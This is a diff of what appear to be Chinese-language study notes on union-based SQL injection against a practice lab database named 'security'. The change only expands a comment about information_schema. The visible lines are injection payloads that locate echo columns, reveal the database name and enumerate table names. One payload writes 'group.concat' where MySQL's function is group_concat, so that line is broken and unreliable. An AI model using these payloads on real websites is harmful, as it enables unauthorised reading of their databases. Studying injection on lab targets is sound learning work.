@@ -196,7 +196,7 @@ id=-1' union select 1,2,3--+  #回显位
 
 id=-1' union select 1,database(),3--+  #获取数据库名
 
-id=-1' union select 1,(select table_name from information_schema.tables where table_schema='security'),3--+  #由于网站限制，只能显示一行，但是返回结果是多行
+id=-1' union select 1,(select table_name from information_schema.tables where table_schema='security'),3--+  #由于网站限制，只能显示一行，但是返回结果是多行，所以报错。其中information_schema 是MySQL数据库中一个特殊的数据库，它包含了数据库服务器的元数据信息，比如数据库名、表名、列名、权限等等
 
 id=-1' union select 1,(select group.concat(table_name) from information_schema.tables where table_schema='security'),3--+  #正确显示出所有表名
 
